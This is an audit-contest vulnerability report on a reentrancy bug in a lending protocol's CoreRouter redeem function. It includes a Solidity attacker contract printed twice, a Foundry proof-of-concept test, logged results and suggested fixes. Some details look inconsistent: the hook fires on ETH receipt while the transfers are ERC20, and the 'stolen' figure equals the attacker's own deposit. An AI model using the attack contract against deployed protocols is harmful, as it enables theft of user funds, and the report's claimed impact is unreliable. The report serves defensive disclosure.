# Reentrancy in CoreRouter's redeem function allows attacker to steal protocol tokens through double redemption

### Summary

A reentrancy vulnerability in `CoreRouter.sol`'s `redeem()` function allows an attacker to redeem the same tokens multiple times before their investment balance is updated, leading to direct theft of protocol funds.

### Root Cause

In `CoreRouter.sol` redeem function : 

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L94C5-L138C6

the redeem function allows an attacker to renter the function by:

- Making external calls to transfer tokens before updating state

- Not implementing reentrancy protection

```solidity

function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
    // External calls happen before state updates
    require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");
    IERC20(_token).transfer(msg.sender, expectedUnderlying);

    // State updates happen after external calls
    lendStorage.distributeSupplierLend(_lToken, msg.sender);
    uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
    lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);
}

```

### Internal Pre-conditions

- CoreRouter must have redeem functionality active (not paused)
- LendStorage's totalInvestment for attacker must be greater than 0
- Attacker needs to have successfully supplied tokens to obtain lTokens:
- Protocol must have sufficient liquidity (shown in test where deployer supplies initial liquidity):


### External Pre-conditions

- The underlying ERC20 token must have a callback mechanism (like transfer or similar) that allows reentrancy:

- The attacker needs enough gas to execute multiple reentrant calls (in test, attacker reenters once):

- Token price/exchange rate must remain relatively stable during attack execution to ensure consistent redeem amounts:

- All these conditions are common in lending protocols, making this vulnerability practically exploitable in real-world conditions with minimal setup requirements

### Attack Path

## Attack Path

1. Attacker deploys malicious contract:

``` soilidity
 pragma solidity 0.8.23;

import {CoreRouter} from "../../src/LayerZero/CoreRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    CoreRouter public coreRouter;
    address public lToken;
    uint256 public amount;
    uint256 public attackCount;
    address public token;

    constructor(address payable _coreRouter) {
        coreRouter = CoreRouter(_coreRouter);
    }

    function attack(address _lToken, uint256 _amount, address _token) external {
        lToken = _lToken;
        amount = _amount;
        token = _token;
        attackCount = 0;
        // Use actual investment amount for redeem
        CoreRouter(coreRouter).redeem(_amount, payable(_lToken));
    }

    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            // Reenter with same amount
            CoreRouter(coreRouter).redeem(amount, payable(lToken));
        }
    }
}

```

2. Supplies small amount of tokens to get lTokens:
```
IERC20(token).approve(address(coreRouter), attackAmount);
coreRouter.supply(attackAmount, token);

```
3. Calls redeem with obtained lTokens

4. During token transfer, receive() triggers and reenters redeem

5. Second redeem succeeds because totalInvestment wasn't updated yet

6. Process repeats until maximum extraction


### Impact

An attacker can steal tokens from the protocol by:

1. Initially supplying a small amount (e.g. 10 ETH) to get lTokens
2. Redeeming those lTokens
3. During the token transfer callback, reentering the redeem function
4. Redeeming the same tokens again before investment balance is updated
5. Repeating until maximum extraction achieved

From my PoC:
``` solidity
Initial investment: 50000000000 (0.05 ETH worth of lTokens)
Initial balance: 0
Final balance: 10000000000000000000 (10 ETH)
Extra tokens stolen: 10000000000000000000 (10 ETH)
```

In this case the attacker was able to extract 10 ETH by only supplying 0.05 ETH worth of collateral.


This vulnerability affects all protocol users since:

- It drains protocol liquidity
- Reduces available tokens for legitimate withdrawals (redemption)
- would lead to protocol insolvency
- No special privileges required to exploit



### PoC

1. create  this malicious contract :  
``` solidity
pragma solidity 0.8.23;

import {CoreRouter} from "../../src/LayerZero/CoreRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    CoreRouter public coreRouter;
    address public lToken;
    uint256 public amount;
    uint256 public attackCount;
    address public token;

    constructor(address payable _coreRouter) {
        coreRouter = CoreRouter(_coreRouter);
    }

    function attack(address _lToken, uint256 _amount, address _token) external {
        lToken = _lToken;
        amount = _amount;
        token = _token;
        attackCount = 0;
        // Use actual investment amount for redeem
        CoreRouter(coreRouter).redeem(_amount, payable(_lToken));
    }

    receive() external payable {
        if (attackCount < 1) {
            attackCount++;
            // Reenter with same amount
            CoreRouter(coreRouter).redeem(amount, payable(lToken));
        }
    }
}
```

2 . Add this test to the existing TestRedeeming.t.sol contract

```solidity
//add this to existing imports in the contract

import {Test, console} from "forge-std/Test.sol";  // Add console here
import {ReentrancyAttacker} from "./mocks/ReentrancyAttacker.sol";


function test_reentrancy_vulnerability_in_redeem() public {
        vm.startPrank(deployer);
        
        // Initial setup - supply a larger amount of tokens
        uint256 supplyAmount = 1000e18;
        (address token, address lToken) = _supply(supplyAmount);
        
        // Deploy attacker contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(payable(address(coreRouter)));
        
        // Transfer tokens to attacker contract - smaller amount for attack
        uint256 attackAmount = 10e18;
        ERC20Mock(token).mint(address(attacker), attackAmount);
        vm.stopPrank();
        
        // Start attack sequence
        vm.startPrank(address(attacker));
        IERC20(token).approve(address(coreRouter), attackAmount);
        coreRouter.supply(attackAmount, token);
        
        // Get attacker's balance before attack
        uint256 initialBalance = IERC20(token).balanceOf(address(attacker));
        uint256 attackerInvestment = lendStorage.totalInvestment(address(attacker), lToken);
        
        console.log("Initial investment:", attackerInvestment);
        
        // Execute attack with the actual investment amount
        attacker.attack(lToken, attackerInvestment, token);
        
        // Verify attack results
        uint256 finalBalance = IERC20(token).balanceOf(address(attacker));
        assertGt(finalBalance, initialBalance, "Reentrancy attack failed");
        
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Extra tokens stolen:", finalBalance - initialBalance);
        
        vm.stopPrank();
    }
}

```

Test Result : 

```solidity
Ran 1 test for test/TestRedeeming.t.sol:TestRedeeming
[PASS] test_reentrancy_vulnerability_in_redeem() (gas: 899561)

```



### Mitigation

The mitigations I can think are 

1. Add OpenZeppelin's ReentrancyGuard:

```solidity
contract CoreRouter is Ownable, ExponentialNoError, ReentrancyGuard {
    function redeem(uint256 _amount, address payable _lToken) external nonReentrant returns (uint256) {

```

2. Follow the popular CEI pattern:

```solidity
function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
    // Checks
    require(_amount > 0, "Zero redeem amount");
    require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

    // existing code
    
    // Effects - Update state first
    uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
    lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);
    
    // Interactions - External calls last
    require(LErc20Interface(_lToken).redeem(_amount) == 0, "Redeem failed");
    IERC20(_token).transfer(msg.sender, expectedUnderlying);
}

```
